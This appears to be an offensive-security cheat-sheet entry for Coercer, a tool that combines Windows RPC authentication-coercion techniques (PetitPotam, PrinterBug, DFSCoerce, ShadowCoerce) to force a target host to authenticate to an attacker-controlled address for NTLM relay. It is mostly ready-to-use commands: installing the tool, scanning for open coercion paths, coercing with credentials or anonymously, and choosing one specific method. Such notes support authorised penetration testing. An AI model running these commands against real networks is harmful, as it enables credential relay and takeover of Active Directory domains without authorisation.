# 04.01 Coercer

> Multi-protocol coercion framework — combines PetitPotam, PrinterBug, DFSCoerce, and many others.

## Overview

Coercer wraps every known coercion vector into one tool. Probes which RPC interfaces the target supports, picks the most likely effective coercion, fires it. Supports PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM), MS-FSRVP (ShadowCoerce), ChickenWing, and others. Replaces having to know which specific tool works.

## Steps

- **Step 1** - Install via pip.
- **Step 2** - Scan target to see which coercion paths are open.
- **Step 3** - Coerce + relay.

## Commands

### Install

```bash
pipx install coercer
```

### Scan target

```bash
coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <TARGET>
```

### Coerce all available

```bash
coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -l <ATTACKER-IP> -t <TARGET>
```

### Specific method

```bash
coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -l <ATTACKER-IP> -t <TARGET> --filter-method-name PetitPotam
```

### Anonymous coercion

```bash
coercer coerce -l <ATTACKER-IP> -t <TARGET> --always-continue
```
